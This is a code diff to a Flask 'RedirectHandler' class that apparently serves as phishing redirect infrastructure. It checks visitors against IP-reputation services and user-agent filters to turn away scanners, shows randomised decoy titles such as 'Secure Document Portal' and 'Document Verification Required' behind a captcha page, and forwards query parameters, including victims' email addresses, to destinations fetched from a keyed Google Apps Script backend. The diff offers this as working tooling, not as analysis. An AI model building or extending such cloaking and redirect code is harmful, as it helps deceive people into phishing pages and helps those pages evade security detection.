@@ -2,12 +2,16 @@ import random
 import requests
 import re
 from flask import request, redirect, render_template
+import os
+from dotenv import load_dotenv
+
+load_dotenv()
 
 class RedirectHandler:
     def __init__(self):
-        self.IPHUB_API_KEY = "YOUR_FREE_IPHUB_API_KEY"
-        self.ABUSEIPDB_API_KEY = "YOUR_ABUSEIPDB_API_KEY"
-        self.APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzpGDrsMrVbWe4xjt39a0AhJWPTmdqLvfSia1-gkSfNK5aTIQ95m83Q-kvIXukn_JxLXA/exec?action=getData&sheetname=REDIRECT&range=A1:F"
+        self.IPHUB_API_KEY = os.getenv('IPHUB_API_KEY')
+        self.ABUSEIPDB_API_KEY = os.getenv('ABUSEIPDB_API_KEY')
+        self.APPSCRIPT_URL = os.getenv('APPSCRIPT_URL')
         self.FLAGGED_IPS = set()
         self.LEGITIMATE_DOMAINS = [
             "https://www.google.com",
@@ -59,53 +63,86 @@ class RedirectHandler:
 
         return False
 
-    def fetch_redirect_data(self):
+    def fetch_redirect_data(self, complete_url, path_to_check):
+        """Fetch redirect data and verify link status with AppScript"""
         try:
-            response = requests.get(self.APPSCRIPT_URL)
+            headers = {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+            payload = {
+                'action': 'verifyRedirectVisit',
+                'completeUrl': complete_url,
+                'path': path_to_check,
+                'key': os.getenv('SCRIPT_KEY')
+            }
+            response = requests.post(self.APPSCRIPT_URL, headers=headers, data=payload)
             if response.status_code == 200:
-                raw_data = response.json()
-                if not isinstance(raw_data, list) or len(raw_data) < 2:
-                    return []
-                headers = raw_data[0]
-                return [dict(zip(headers, row)) for row in raw_data[1:]]
+                data = response.json()
+                if data.get('success'):
+                    return {
+                        'success': True,
+                        'redirectURL': data.get('redirectURL'),
+                        'status': data.get('status', 'active')
+                    }
+                return {
+                    'success': False,
+                    'error': data.get('error', 'Invalid response from server')
+                }
+            return {
+                'success': False,
+                'error': f'Server error: {response.status_code}'
+            }
         except Exception as e:
-            print("Exception:", str(e))
-        return []
+            print("Exception in fetch_redirect_data:", str(e))
+            return {
+                'success': False,
+                'error': str(e)
+            }
 
-    def generate_random_metadata(self):
-        titles = ["Verifying Access", "Loading Secure Page", "Authentication Required"]
-        descriptions = [
-            "Please wait while we verify your request...",
-            "Ensuring a secure browsing experience...",
-            "Processing your request, please wait..."
-        ]
-        keywords = [
-            "secure, verification, human check",
-            "captcha, security, authentication",
-            "bot protection, identity verification"
-        ]
-        
-        return {
-            "title": random.choice(titles),
-            "description": random.choice(descriptions),
-            "keywords": random.choice(keywords)
-        }
+    def preserve_query_params(self, original_url, redirect_url):
+        """Preserve query parameters from original URL to redirect URL"""
+        try:
+            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+            
+            # Parse both URLs
+            original_parsed = urlparse(original_url)
+            redirect_parsed = urlparse(redirect_url)
+            
+            # Get query parameters from both URLs
+            original_params = parse_qs(original_parsed.query)
+            redirect_params = parse_qs(redirect_parsed.query)
+            
+            # Merge parameters, redirect_params taking precedence
+            merged_params = {**original_params, **redirect_params}
+            
+            # Reconstruct the URL with merged parameters
+            new_query = urlencode(merged_params, doseq=True)
+            new_parts = list(redirect_parsed)
+            new_parts[4] = new_query
+            
+            return urlunparse(new_parts)
+        except Exception as e:
+            print("Error preserving query params:", str(e))
+            return redirect_url
 
-    def handle_archive_path(self, num):
-        data = self.fetch_redirect_data()
-        redirect_map = {row['path']: row['redirectURL'] for row in data if row['redirectURL']}
-        path = f'archive{num}'
-
-        if path in redirect_map:
-            redirect_url = redirect_map[path]
-            email = request.args.get('email')
-            if email:
-                redirect_url = f"{redirect_url}?email={email}"
+    def handle_archive_path(self, path):
+        try:
+            complete_url = request.url
+            
+            redirect_data = self.fetch_redirect_data(complete_url, path)
+            
+            if not redirect_data['success']:
+                return render_template('error.html', message=redirect_data['error']), 404
+                
+            redirect_url = redirect_data['redirectURL']
+            redirect_url = self.preserve_query_params(complete_url, redirect_url)
+            
             return render_template('captcha.html', redirect_url=redirect_url)
+            
+        except Exception as e:
+            return render_template('error.html', message=str(e)), 500
 
-        return render_template('error.html', message="Path not found"), 404
-
-    def handle_premium_path(self, num):
+    def handle_premium_path(self, path):
         visitor_ip = request.remote_addr
         user_agent = request.headers.get('User-Agent', '')
         
@@ -125,23 +162,56 @@ class RedirectHandler:
         if self.is_ip_flagged(visitor_ip):
             return render_template('error.html', message="Access denied: Suspicious activity detected"), 403
 
-        data = self.fetch_redirect_data()
-        redirect_map = {row['directory']: row['redirectURL'] for row in data if row['redirectURL']}
-        path = f'directory{num}'
-
-        if path in redirect_map:
-            redirect_url = redirect_map[path]
-            email = request.args.get('email', '')
+        try:
+            complete_url = request.url
+            
+            redirect_data = self.fetch_redirect_data(complete_url, path)
+            
+            if not redirect_data['success']:
+                return render_template('error.html', message=redirect_data['error']), 404
+                
+            redirect_url = redirect_data['redirectURL']
+            redirect_url = self.preserve_query_params(complete_url, redirect_url)
+            
             metadata = self.generate_random_metadata()
-
             return render_template(
                 'redirect.html', 
                 redirect_url=redirect_url, 
-                email=email, 
                 meta_title=metadata['title'], 
                 meta_description=metadata['description'], 
                 meta_keywords=metadata['keywords'],
                 random_token=random.randint(100000, 999999)
             )
+            
+        except Exception as e:
+            return render_template('error.html', message=str(e)), 500
 
-        return render_template('error.html', message="Path not found"), 404
+    def generate_random_metadata(self):
+        """Generate random metadata for SEO purposes"""
+        titles = [
+            "Document Access - Please Wait",
+            "Secure Document Portal",
+            "Loading Document Library",
+            "Document Verification Required",
+            "Processing Your Request"
+        ]
+        descriptions = [
+            "Secure document access portal. Please wait while we verify your credentials.",
+            "Document management system. Verification in progress.",
+            "Accessing secure document storage. Please be patient.",
+            "Enterprise document portal. Processing your request.",
+            "Document gateway access. Security check in progress."
+        ]
+        keywords = [
+            "document access, secure portal, verification",
+            "document management, security, enterprise",
+            "secure storage, document library, access",
+            "enterprise portal, document system, gateway",
+            "document verification, secure access, portal"
+        ]
+        
+        return {
+            'title': random.choice(titles),
+            'description': random.choice(descriptions),
+            'keywords': random.choice(keywords)
+        }
